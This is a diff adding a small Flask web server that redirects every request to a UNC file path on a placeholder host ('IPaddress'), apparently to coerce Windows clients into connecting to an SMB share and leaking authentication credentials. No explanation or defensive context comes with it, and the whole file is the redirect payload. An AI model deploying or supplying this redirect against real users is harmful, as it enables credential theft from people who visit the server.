@@ -1,0 +1,15 @@
+from flask import Flask, make_response
+
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def redirect_to_unc(path):
+    unc_path = r'\\\\IPaddress\\test.docx'
+
+    response = make_response('', 302)
+    response.headers['Location'] = unc_path
+    return response
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=80)
